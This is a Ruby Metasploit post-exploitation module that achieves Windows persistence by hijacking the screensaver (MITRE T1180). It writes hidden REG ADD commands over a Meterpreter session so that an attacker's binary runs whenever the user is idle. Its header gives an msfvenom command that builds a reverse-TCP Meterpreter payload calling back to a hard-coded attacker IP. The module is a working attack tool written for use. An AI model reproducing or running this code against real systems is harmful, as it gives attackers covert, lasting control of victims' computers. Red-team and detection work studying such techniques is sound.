##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : SCRNSAVE_T1180_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Affected system: Windows (2008|xp|vista|7|9|10)
# POC: https://attack.mitre.org/techniques/T1180/
#
#
# [ DESCRIPTION ]
# To achieve persistence the attacker can modify SCRNSAVE.EXE value in the registry and change its data to point
# to any malicious file, next the attacker has to enable the screensaver on the endpoint and change screensaver timeout
# by modifying the registry data for 'ScreenSaveActive' and 'ScreenSaveTimeOut'. Once this is completed, anytime the user
# leaves their desktop unattended for the specified amount of time, the screensaver function automatically kicks in and
# executes the attackers malicious PE/Appl.
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on              => set SESSION 1
# Set inactivity timeout before screensaver runs (sec)  => set TIME_OUT 10
# Set the absoluct path of PE or application to run     => set APPL_PATH C:\\Users\\pedro\\Desktop\\binary.exe
# Set the absoluct path where to store logfiles (local) => set LOOT_FOLDER /root
# LogOff current user to force registry refresh?        => set LOG_OFF true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
# path=$(locate modules/post/windows/escalate | grep -v '\doc' | grep -v '\documentation' | head -n 1)
# sudo cp SCRNSAVE_T1180_persistence.rb $path/SCRNSAVE_T1180_persistence.rb
#
#
# [ RELOAD MSF DATABASE (execute in terminal) ]
# sudo service postgresql start && msfdb reinit
# sudo msfconsole -x 'db_status;reload_all;exit -y'
#
#
# [ BUILD PAYLOAD TO TEST MODULE ]
# sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f exe -o binary.exe
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/windows/escalate/SCRNSAVE_persistence
# msf post(SCRNSAVE_T1180_persistence) > info
# msf post(SCRNSAVE_T1180_persistence) > show options
# msf post(SCRNSAVE_T1180_persistence) > show advanced options
# msf post(SCRNSAVE_T1180_persistence) > set [option(s)]
# msf post(SCRNSAVE_T1180_persistence) > exploit
##



#
# Metasploit Module librarys to load ..
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'


#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry


#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'SCRNSAVE T1180 (User-land Persistence)',
                        'Description'   => %q{
                                        To achieve persistence the attacker can modify 'SCRNSAVE.EXE' value in the registry and change its data to point to any malicious file, next the attacker has to enable the screensaver on the endpoint and change screensaver timeout by modifying the registry data for 'ScreenSaveActive' and 'ScreenSaveTimeOut'. Once this is completed, anytime the user leaves their desktop unattended for the specified amount of time, the screensaver function automatically kicks in and executes the attackers malicious PE/Appl.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: r00t-3xp10it',
                                        'Special Thanks: shanty damayanti',
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => '11 02 2019',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # Thats no need for privilege escalation.
                        'Targets'        =>
                                [
                                         # Affected systems are.
                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # Default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'https://attack.mitre.org/techniques/T1180/' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://ired.team/offensive-security/t1180-screensaver-hijack' ],
                                         [ 'URL', 'https://www.howtogeek.com/225305/how-to-find-and-set-screen-savers-on-windows-10/' ]


                                ],
			'DefaultOptions' =>
				{
                                         'LOOT_FOLDER' => '/root/.msf4/loot',            # Default logs storage directory
                                         'APPL_PATH' => '%windir%\\System32\\calc.exe',  # Default PE/appl (payload) to run (test)
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
                                OptString.new('TIME_OUT', [ true, 'Set inactivity timeout before screensaver runs', 10]),
                                OptString.new('APPL_PATH', [ true, 'Set absoluct path of malicious PE/Appl to run'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('LOG_OFF', [ false, 'Logoff current user to force registry refresh?', false]),
                                OptString.new('LOOT_FOLDER', [ true, 'Set the absoluct path where to store revert.rc (local)'])
                        ], self.class)

        end



def run
  session = client
  #
  # Variable declarations (msf API calls)
  #
  oscheck = client.fs.file.expand_path("%OS%")
  sysnfo = session.sys.config.sysinfo
  runtor = client.sys.config.getuid
  runsession = client.session_host
  directory = client.fs.dir.pwd
  # elevate session privileges befor runing
  client.sys.config.getprivs.each do |priv|
  end
  #
  # MODULE BANNER
  #
  print_line("    +--------------------------------------------+")
  print_line("    |    SCRNSAVE.EXE (User-Land Persistence)    |")
  print_line("    |        Author : r00t-3xp10it (SSA)         |")
  print_line("    +--------------------------------------------+")
  print_line("")
  print_line("    Running on session  : #{datastore['SESSION']}")
  print_line("    Architecture        : #{sysnfo['Architecture']}")
  print_line("    Computer            : #{sysnfo['Computer']}")
  print_line("    Target IP addr      : #{runsession}")
  print_line("    Operative System    : #{sysnfo['OS']}")
  print_line("    Payload directory   : #{directory}")
  print_line("    Client UID          : #{runtor}")
  print_line("")
  print_line("")


  #
  # Post-Module variable declarations ..
  #
  r=''
  hacks = []
  scrnsave_data=''
  scrnsave_timeout=''
  time_out = datastore['TIME_OUT']  # 10 sec (if inactive)
  app_path = datastore['APPL_PATH'] # %windir%\\System32\\calc.exe
  hive_key = "HKCU\\Control Panel\\Desktop" # vulnerable hive key
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['APPL_PATH'] == 'nil'
    print_error("Options not configurated correctly, execute: info")
    print_warning("Please set APPL_PATH <absoluct-path-to-PE/appl.exe>")
    return nil
  else
   print_warning("SCRNSAVE.EXE mitre ATT&CK T1180 (user-land persistence)")
    Rex::sleep(1.5)
  end
  # check for proper operative system (windows-not-wine)
  if not oscheck == "Windows_NT"
    print_error("[ ABORT ]: This module only works againts windows systems.")
    return nil
  end
  # check for proper operative system version
  if not sysinfo['OS'] =~ /Windows (2008|xp|vista|7|9|10)/
    print_error("[ ABORT ]: #{sysnfo['OS']} versions are not affected by mitre ATT&CK T1180.")
    return nil
  end


    #
    # Search in target regedit if hijack hive exists .. 
    #
    print_status("Checking #{sysnfo['Computer']} for mitre ATT&CK T1180 vulnerability.")
    Rex::sleep(1.0)
    if registry_getvaldata("#{hive_key}","SCRNSAVE.EXE")
      print_good("Target system appears to be vulnerable to the exploit code.")
      Rex::sleep(0.5)
    else
      # registry hive key not found, aborting module execution ..
      print_error("NOT FOUND: #{hive_key} SCRNSAVE.EXE")
      print_warning("Target system does not appear to be vulnerable to the exploit code.")
      return nil
    end


      #
      # check if PE/appl exists in remote system (APPL_PATH)
      #
      print_status("checking for #{app_path} in #{sysnfo['Computer']}")
      Rex::sleep(1.0)
      if session.fs.file.exist?(app_path)
        print_good("Remote PE/Application found on target system.")
        Rex::sleep(0.5)
      else
        print_error("Remote PE/Application NOT found on target system.")
        Rex::sleep(1)
        # If the variable 'app_path' does not contain the char \ in path 
        # It meens that user have imput the path using only one \ insted of \\ (parsing error)
        unless app_path.include? "\\"
          print_warning("Warning: Allways use double backslashs defining windows paths.")
          return nil
        end
        print_warning("Deploy your payload in target system before using this module.")
        print_warning("OR: Point to one existing application absoluct path (to test).")
        return nil
      end


    #
    # Store default reg values (target system) to build revert.rc later.
    #
    print_status("Store default registry values to build revert.rc script.")
    Rex::sleep(1.0)
    print_status("Retriving default SCRNSAVE.EXE registry value data.")
    scrnsave_data = registry_getvaldata('HKCU\Control Panel\Desktop','SCRNSAVE.EXE')
    Rex::sleep(0.5)
      # make sure the retrieve values are not empty strings
      if scrnsave_data.nil? || scrnsave_data == '' || scrnsave_data == ' '
        print_warning("Reg value contains empty data, set module default data.")
        scrnsave_data = '%windir%\\\\System32\\\\Mystify.src' # windows 10 default data
        Rex::sleep(0.5)
      end
    print_status("Retriving default ScreenSaveTimeOut registry value data.")
    scrnsave_timeout = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveTimeOut')
    Rex::sleep(0.5)
      # make sure the retrieve values are not empty strings
      if scrnsave_timeout.nil? || scrnsave_timeout == '' || scrnsave_timeout == ' '
        print_warning("Reg value contains empty data, set module default data [180]")
        scrnsave_timeout = "180" # 180 sec == 3 minuts waiting
        Rex::sleep(0.5)
      end
    print_status("Retriving default ScreenSaverIsSecure registry value data.")
    scrnsave_issecure = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaverIsSecure')
    Rex::sleep(0.5)
      # make sure the retrieve values are not empty strings
      if scrnsave_issecure.nil? || scrnsave_issecure == '' || scrnsave_issecure == ' '
        print_warning("Reg value contains empty data, set module default data [0]")
        scrnsave_issecure = "0" # 0 == set screensave secure off
        Rex::sleep(0.5)
      end
    print_status("Retriving default ScreenSaveActive registry value data.")
    scrnsave_active = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
    Rex::sleep(0.5)
      # make sure the retrieve values are not empty strings
      if scrnsave_active.nil? || scrnsave_active == '' || scrnsave_active == ' '
        print_warning("Reg value contains empty data, set module default data [1]")
        scrnsave_active = "1" # 1 == set screensave active on
        Rex::sleep(0.5)
      end


    #
    # create revert.rc resource file (in attackers PC)
    # (To revert target registry hacked values to default before the hack)
    #
    rand = Rex::Text.rand_text_alpha(5)
    print_good("Writing revert_#{rand}.rc resource file (local).")
    Rex::sleep(1.0)
      loot_folder = datastore['LOOT_FOLDER'] # /root/.msf4/loot
      File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
        f.write("###\n")
        f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.\n")
        f.write("## Computer: #{sysnfo['Computer']} | OS: #{sysnfo['OS']}\n")
        f.write("## Payload: #{app_path} | Timeout: #{time_out}\n")
        f.write("## To revert hack execute in meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
        f.write("###\n")
        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d #{scrnsave_active}\n")
        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaverIsSecure -t REG_SZ -d #{scrnsave_issecure}\n")
        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveTimeOut -t REG_SZ -d #{scrnsave_timeout}\n")
        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v SCRNSAVE.EXE -t REG_SZ -d #{scrnsave_data}\n")
        f.close
      end


        #
        # List of registry keys to add to target regedit .. 
        #
        print_status("Hijacking #{sysnfo['Computer']} remote registry keys.")
        Rex::sleep(1.0)
          hacks = [
            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f",
            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d #{time_out} /f",
            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",
            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d #{app_path} /f"
          ]
         #
         # LOOP funtion to add reg keys
         #
         print_line("")
         session.response_timeout=120
         hacks.each do |cmd|
            begin
              # execute cmd prompt in a hidden channelized windows
              r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
              print_line("    Hijack: #{cmd}")
 
                # close client channel when done
                while(d = r.channel.read)
                        break if d == ""
                end
                r.channel.close
                r.close
              # error exception funtion
              rescue ::Exception => e
              print_error("Error Running Command: #{e.class} #{e}")
            end
         end


       #
       # exploit finished (print info onscreen)
       #
       print_line("")
       print_good("Persistence achieved in remote system.")
       Rex::sleep(1.0)
       print_line("-----------------------------------------------------")
       print_line("Malicious PE/App : #{app_path}")
       print_line("Trigger exploit  : every #{time_out} sec (if inactive)")
       print_line("Revert.rc script : resource #{loot_folder}/revert_#{rand}.rc")
       print_line("-----------------------------------------------------")
       # check if user have set the logoff option
       if datastore['LOG_OFF'] == false
         print_warning("WARNING: Target system needs to logoff for changes take effect.")
       end


     #
     # force target system logoff to refresh registry?
     # shutdown using wmic: wmic os where Primary='TRUE' reboot
     #
     Rex::sleep(1.0)
     if datastore['LOG_OFF'] == true
       print_warning("Logoff #{sysnfo['Computer']} to force registry refresh.")
       Rex::sleep(1)
       cmd_exec("shutdown -L")
     end

   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end

end
